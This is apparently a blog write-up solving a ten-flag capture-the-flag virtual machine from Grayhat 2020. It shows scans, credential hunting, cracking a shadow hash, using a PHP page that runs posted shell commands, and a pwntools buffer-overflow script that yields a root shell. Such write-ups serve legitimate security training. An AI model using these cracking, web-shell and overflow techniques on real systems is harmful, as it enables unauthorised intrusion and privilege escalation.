---
layout: post
title: SECARMY VILLAGE OSCP Challenge @ Grayhat 2020
---

For Grayhat 2020, SECARMY VILLAGE put up a [Vulnhub Box](https://www.vulnhub.com/entry/secarmy-village-grayhat-conference,585/) and opened a CTFd at secarmyvillage.ml to submit flags. There were 10 flags to find on the box, and those that solved all of them would be elligible to win one of three PwK vouchers. I got all the flags and solved all the challenges, ending with 10,000 pointsin 1st place. Well... technically I was 106th and tied for 1st place with 113 other people, but I'm going to remember it like I won.

## Enumeration
```
# Nmap 7.80 scan initiated Thu Oct 29 23:26:33 2020 as: nmap -sC -sV -Pn -p 21,22,80,1337 -oN nmap.txt 192.168.1.152
Nmap scan report for svos.attlocal.net (192.168.1.152)
Host is up (0.0076s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c:54:d0:5a:ae:b3:4f:5b:f8:65:5d:13:c9:ee:86:75 (RSA)
|   256 0c:2b:3a:bd:80:86:f8:6c:2f:9e:ec:e4:7d:ad:83:bf (ECDSA)
|_  256 2b:4f:04:e0:e5:81:e4:4c:11:2f:92:2a:72:95:58:4e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Totally Secure Website
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GetRequest, HTTPOptions, Help, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     Welcome to SVOS Password Recovery Facility!
|     Enter the super secret token to proceed: 
|     Invalid token!
|     Exiting!
|   DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     Welcome to SVOS Password Recovery Facility!
|_    Enter the super secret token to proceed:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=10/29%Time=5F9B87F0%P=x86_64-pc-linux-gnu%r(N
SF:ULL,58,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility
SF:!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20")
SF:%r(GenericLines,58,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery
SF:\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20pr
SF:oceed:\x20")%r(GetRequest,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x
SF:20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x
SF:20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(HTT
SF:POptions,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Fac
SF:ility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed:\
SF:x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(RTSPRequest,74,"\n\x
SF:20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter
SF:\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\
SF:x20token!\n\x20Exiting!\x20\n")%r(RPCCheck,58,"\n\x20Welcome\x20to\x20S
SF:VOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20
SF:secret\x20token\x20to\x20proceed:\x20")%r(DNSVersionBindReqTCP,58,"\n\x
SF:20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter
SF:\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20")%r(DNSStatus
SF:RequestTCP,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20F
SF:acility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed
SF::\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(Help,74,"\n\x20Wel
SF:come\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20t
SF:he\x20super\x20secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\x20to
SF:ken!\n\x20Exiting!\x20\n")%r(SSLSessionReq,74,"\n\x20Welcome\x20to\x20S
SF:VOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20
SF:secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiti
SF:ng!\x20\n")%r(TerminalServerCookie,74,"\n\x20Welcome\x20to\x20SVOS\x20P
SF:assword\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x
SF:20token\x20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\
SF:n")%r(TLSSessionReq,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Reco
SF:very\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x
SF:20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 29 23:27:27 2020 -- 1 IP address (1 host up) scanned in 53.25 seconds
```

The webpage tells us to find a hidden directory. After a very quick gobust, we find it:

```
gobuster dir --url 192.168.1.152 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.152
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/30 00:11:39 Starting gobuster
===============================================================
/javascript (Status: 301)
/anon (Status: 301)
```

Going to view-source:http://192.168.1.152/anon/, we get the creds: `<font color="white">uno:luc10r4m0n</font>`.

## Gaining Access

```
$ ssh 192.168.1.152 -l uno # password luc10r4m0n
uno@svos:~$ cat flag1.txt 
Congratulations!
Here's your first flag segment: flag1{fb9e88}
```

## Privilege Escalation/Flag Hunting

```
uno@svos:~$ cat readme.txt 
Head over to the second user!
You surely can guess the username , the password will be:
4b3l4rd0fru705
uno@svos:~$ su dos # 4b3l4rd0fru705

dos@svos:~$ grep a8211ac1853a1235d48829414626512a files/ -r
files/file4444.txt:a8211ac1853a1235d48829414626512a
dos@svos:~$ tail -n 2 files/file4444.txt
a8211ac1853a1235d48829414626512a
Look inside file3131.txt
dos@svos:~$ tail -n 12 files/file3131.txt 
UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA

dos@svos:~$ tail -n 12 files/file3131.txt | tr -d "[:space:]" | base64 -d
PK3�;Q
      challenge2/P�6Q���>Achallenge2/flag2.txts��K/J,)�I,���+V���H-JU/V��/-R(NM��KQH�IL��sS�J��<�j3#�D#�Z.P3�;Q(���t�cha�9�0��S��.���t)8H�^�1"��K��I3�l�(u>
                                   �F�Q�����W
�N�:��!b�8�
           E��gH��LX���&r�Mr+������:x��J<�p�PK?3�;Q
                                                   $��Achallenge2/
 ��2$ݔ���jMސ���2$ݔ�PK�6Q���>A$ ���)challenge2/flag2.txt
 ��kސ���kސ���kސ�PK3�;Q(���t�$ ����challenge2/todo.txt
 ��2$ݔ���2$ݔ���2$ݔ�PK(>
```

Due to the filenames, this looks like an archive of some kind.

```
dos@svos:~$ file zipfile 
zipfile: Zip archive data, at least v2.0 to extract
dos@svos:~$ unzip zipfile
Archive:  zipfile
   creating: challenge2/
  inflating: challenge2/flag2.txt    
  inflating: challenge2/todo.txt     
dos@svos:~$ cat challenge2/*
Congratulations!

Here's your second flag segment: flag2{624a21}
Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b

dos@svos:~$ nc localhost 1337

 Welcome to SVOS Password Recovery Facility!
 Enter the super secret token to proceed: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b

 Here's your login credentials for the third user tres:r4f43l71n4j3r0

dos@svos:~$ su tres # Onto flag tres!

tres@svos:~$ cat flag3.txt 
Congratulations! Here's your third flag segment: flag3{ac66cf}
```

Inside the home directory of tres, there is a 64 bit ELF file name secarmy-village and a readme saying to reverse engineer the binary.

```
tres@svos:~$ readelf -h secarmy-village 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x2b78
  Start of program headers:          64 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         3
  Size of section headers:           64 (bytes)
  Number of section headers:         0
  Section header string table index: 0
tres@svos:~$ objdump -f secarmy-village 

secarmy-village:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000140:
DYNAMIC, D_PAGED
start address 0x0000000000002b78

tres@svos:~$ gdb secarmy-village # entry point 0x2b78
...
(gdb) info files
Symbols from "/home/tres/secarmy-village".
```

There were no symbols, so I figured the executable must be packed. 

```
tres@svos:~$ strings secarmy-village | grep UPX
UPX!
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.95 Copyright (C) 1996-2018 the UPX Team. All Rights Reserved. $
UPX!u
UPX!
UPX!
```

Because there was no UPX installed, I copied the file to my host.

```
root@kali:~/ctf/secarmy2020# scp tres@192.168.1.152:secarmy-village .
...
root@kali:~/ctf/secarmy2020# upx -d secarmy-village 
...
root@kali:~/ctf/secarmy2020# strings secarmy-village | grep cuatro
Here's the credentials for the fourth user cuatro:p3dr00l1v4r3z
root@kali:~/ctf/secarmy2020# ssh 192.168.1.152 -l cuatro
...
cuatro@svos:~$ cat flag4.txt 
Congratulations, here's your 4th flag segment: flag4{1d6b06}
cuatro@svos:~$ cat todo.txt 
We have just created a new web page for our upcoming platform, its a photo gallery. You can check them out at /justanothergallery on the webserver.
```

Here is the photo-grabber.py script I wrote to download and extract the data from the 68 QR codes on the site.

```
import os, sys, re
from PIL import Image
from pyzbar.pyzbar import decode

URLstub = "http://192.168.1.152/justanothergallery/qr/"

for x in range(0,69):
    img = "image-"+ str(x)+".png"
    url = URLstub+img
    os.system("wget -q " + url)
    qr = decode(Image.open(img))
    print(qr[0].data.decode('utf-8'), end=' ')
    os.remove(img)

print()
```

Here is the output:

```
root@kali:~/ctf/secarmy2020/QR# python3 photo-grabber.py 
Hello and congrats for solving this challenge, we hope that you enjoyed the challenges we presented so far. It is time for us to increase the difficulty level and make the upcoming challenges more challenging than previous ones. Before you move to the next challenge, here are the credentials for the 5th user: cinco:ruy70m35 head over to this user and get your 5th flag! goodluck for the upcoming challenges! 

root@kali:~/ctf/secarmy2020# ssh 192.168.1.152 -l cinco

cinco@svos:~$ cat flag5.txt 
Congratulations! Here's your 5th flag segment: flag5{b1e870}
cinco@svos:~$ cat readme.txt 
Check for Cinco's secret place somewhere outside the house

cinco@svos:/cincos-secrets$ ls
hint.txt  shadow.bak
cinco@svos:/cincos-secrets$ cat hint.txt 
we will, we will, ROCKYOU..!!!
cinco@svos:/cincos-secrets$ cat shadow.bak 
cat: shadow.bak: Permission denied
cinco@svos:/cincos-secrets$ file shadow.bak 
shadow.bak: writable, regular file, no read permission
cinco@svos:/cincos-secrets$ chmod +r shadow.bak 
cinco@svos:/cincos-secrets$ cat shadow.bak 
...
seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::

root@kali:~/ctf/secarmy2020# john seis.hash --wordlist=~/rockyou.txt
...
Hogwarts         (seis)

seis@svos:~$ cat flag6.txt 
Congratulations! Here's your 6th flag segment: flag6{779a25}
seis@svos:~$ cat readme.txt 
head over to /shellcmsdashboard webpage and find the credentials!
```

There is a very basic login form at http://192.168.1.152/shellcmsdashboard/index.php. I considered brute-forcing it with hydra (which would've worked with rockyou wordlist), but first checked robots.txt: http://192.168.1.152/shellcmsdashboard/robots.txt.

```
# Username: admin Password: qwerty
User-agent: *
Allow: /
```

Entering those credentials, a line appears: `head over to /aabbzzee.php`. At http://192.168.1.152/shellcmsdashboard/aabbzzee.php there is a User Search form. I tried all the usernames on the box to no avail. I then realized this would all be hosted from /var/www/, and I could potentially get more info there.

```
seis@svos:~$ cd /var/www/html/shellcmsdashboard
seis@svos:/var/www/html/shellcmsdashboard$ ls
aabbzzee.php  index.php  readme9213.txt  robots.txt
seis@svos:/var/www/html/shellcmsdashboard$ cat readme9213.txt 
cat: readme9213.txt: Permission denied
seis@svos:/var/www/html/shellcmsdashboard$ ls -l readme9213.txt 
--wx-wx-wx 1 www-data root 48 Oct  8 17:54 readme9213.txt
seis@svos:/var/www/html/shellcmsdashboard$ tail aabbzzee.php 
    if(isset($_POST['comm']))
    {
        $cmd = $_POST['comm'];
        echo "<center>";
        echo shell_exec($cmd);
        echo"</center>";
    }
?>
</body>
</html>
```

Running whoami from the search bar, returns www-data. I then ran `chmod +r readme9213.txt`, so seis could read it.

```
seis@svos:/var/www/html/shellcmsdashboard$ cat readme9213.txt 
password for the seventh user is 6u1l3rm0p3n473

siete@svos:~$ cat flag7.txt 
Congratulations!
Here's your 7th flag segment: flag7{d5c26a}

siete@svos:~$ cat hint.txt 
Base 10 and Base 256 result in Base 256!
siete@svos:~$ cat message.txt 
[11 29 27 25 10 21 1 0 23 10 17 12 13 8]
siete@svos:~$ cat key.txt 
x

root@kali:~/ctf/secarmy2020# cat XOR.py 

b1 = bytearray("x")
b2 = bytearray([ 11, 29, 27, 25, 10, 21, 1, 0, 23, 10, 17, 12, 13, 8 ])
b = bytearray(len(b2))
for i in range(len(b2)):
    b[i]= b1[0] ^ b2[i]

print b
root@kali:~/ctf/secarmy2020# python XOR.py 
secarmyxoritup

siete@svos:~$ unzip password.zip 
Archive:  password.zip
[password.zip] password.txt password: 
 extracting: password.txt            
siete@svos:~$ cat password.txt 
the next user's password is m0d3570v1ll454n4
```

New creds! `ocho:m0d3570v1ll454n4`

```
ocho@svos:~$ ls
flag8.txt  keyboard.pcapng
ocho@svos:~$ cat flag8.txt 
Congratulations!
Here's your 8th flag segment: flag8{5bcf53}

root@kali:~/ctf/secarmy2020# scp ocho@192.168.1.152:~/keyboard.pcapng .
ocho@192.168.1.152's password: 
keyboard.pcapng                                100%   13MB  33.7MB/s   00:00    
root@kali:~/ctf/secarmy2020# wireshark keyboard.pcapng &
```

I checked the Exportable objects, one of which was none.txt from 95f71887cfe3.ngrok.io. This file contained text from a Quora article that was later posted on Forbes. It also contained a string.

```
root@kali:~/ctf/secarmy2020# grep READING none.txt 
The striker lockup came when a typist quickly typed a succession of letters on the same type bars and the strikers were adjacent to each other. There was a higher possibility for the keys to become jammed. READING IS NOT IMPORTANT, HERE IS WHAT YOU WANT: "mjwfr?2b6j3a5fx/" if the sequence was not perfectly timed. The theory presents that Sholes redesigned the type bar so as to separate the most common sequences of letters: “th”, “he” and others from causing a jam.
```

I didn't know what the string could be. I thought perhaps it was a directory or file.

```
ocho@svos:~$ grep -rnw / -e "mjwfr?2b6j3a5fx/" 2>/dev/null
Binary file /home/ocho/keyboard.pcapng matches
```

But sticking to the keyboard theme, I thought of keyboard shift ciphers. There is a great solver/encoder at [dcode.fr](https://www.dcode.fr/keyboard-shift-cipher). There I learned that `nueve:355u4z4rc0` was a Right + Clockwise QWERTY rotation of my ciphertext.

```
nueve@svos:~$ cat flag9.txt 
Congratulations!
Here's your 9th flag segment: flag9{689d3e}
```

## Privilege Escalation

In addition to the flag file, nueve's home folder has a readme.txt file which contains ASCII art of an "orangutan" that needs to be fed and an ELF file named orangutan. I downloaded the ELF and began examining it.

```
root@kali:~/ctf/secarmy2020# checksec orangutan
[*] '/root/ctf/secarmy2020/orangutan'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

I considered trying some advanced ROP, but thought a bruteforcer might be more appropriate for a first try. Only python3 was installed on the box, which was disappointing because I prefer working with bytes in python2. Luckily, I could install pwntools on the box for python3 though. I decided to download the binary with `scp` and mess around on my own machine. I wrote this bruteforcing script that identified 24 bytes to be the correct offset:

```
from pwn import *
key=p32(0xcafebabe)
print "Brute-Force for the value starts"
for i in range (0, 41):
    p = process("./orangutan")
    p.sendline('A' * i + key)
    print "current offset", i
    p.interactive()
```

I wrote a stripped down script with just the correct offset on the victim machine:

```
nueve@svos:~$ pip3 install pwntools
...
nueve@svos:~$ cat bof.py 
from pwn import *
key=p32(0xcafebabe)
p = process("./orangutan")
p.sendline(bytes('A' * 24, 'utf-8') + key)
p.interactive()

nueve@svos:~$ python3 bof.py 
[+] Starting local process './orangutan': pid 15307
[*] Switching to interactive mode
hello pwner 
pwnme if u can ;) 
$ whoami
root
$ ls /root
pw.sh  root.txt  svos_password_recovery
$ cat /root/root.txt
Congratulations!!!

You have finally completed the SECARMY OSCP Giveaway Machine

Here's your final flag segment: flag10{33c9661bfd}

Head over to https://secarmyvillage.ml/ for submitting the flags!
```

This was a fun and at times difficult challenge box. Thanks to the people at SECARMY and Grayhat that hosted this!
